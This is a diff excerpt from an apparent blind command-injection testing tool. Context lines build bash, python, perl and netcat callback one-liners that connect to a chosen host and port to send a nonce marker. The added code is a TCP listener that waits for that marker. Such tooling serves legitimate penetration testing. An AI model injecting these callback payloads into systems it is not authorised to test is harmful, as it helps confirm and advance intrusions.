@@ -173,3 +173,46 @@ def blind_callback_payload(lhost: str, lport: int, nonce: str) -> str:
             f"connect(S,sockaddr_in({lport},inet_aton(\"{lhost}\")));send(S,\"{nonce}-MARK\",0);'")
     nc = f"echo {nonce}-MARK | nc {lhost} {lport}"
     return _first_available(("bash", bash), ("python3", py), ("perl", perl), ("nc", nc))
+
+
+class _Listener:
+    """Ephemeral TCP listener bound on deddy (reachable via --network=host)."""
+
+    def __init__(self, bind_ip: str = "0.0.0.0", timeout: float = 10.0):
+        self._bind_ip = bind_ip
+        self._timeout = timeout
+        self._srv: socket.socket | None = None
+        self.port = 0
+
+    def __enter__(self) -> "_Listener":
+        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        self._srv.bind((self._bind_ip, 0))     # 0 → OS picks an ephemeral high port
+        self._srv.listen(1)
+        self._srv.settimeout(self._timeout)
+        self.port = self._srv.getsockname()[1]
+        return self
+
+    def __exit__(self, *exc) -> None:
+        if self._srv is not None:
+            try:
+                self._srv.close()
+            finally:
+                self._srv = None
+
+    def accept_one(self) -> socket.socket | None:
+        try:
+            conn, _ = self._srv.accept()
+            return conn
+        except OSError:
+            return None
+
+    def wait_for_nonce(self, nonce: str) -> bool:
+        conn = self.accept_one()
+        if conn is None:
+            return False
+        try:
+            data = _drain(conn, self._timeout)
+        finally:
+            conn.close()
+        return f"{nonce}-MARK".encode() in data
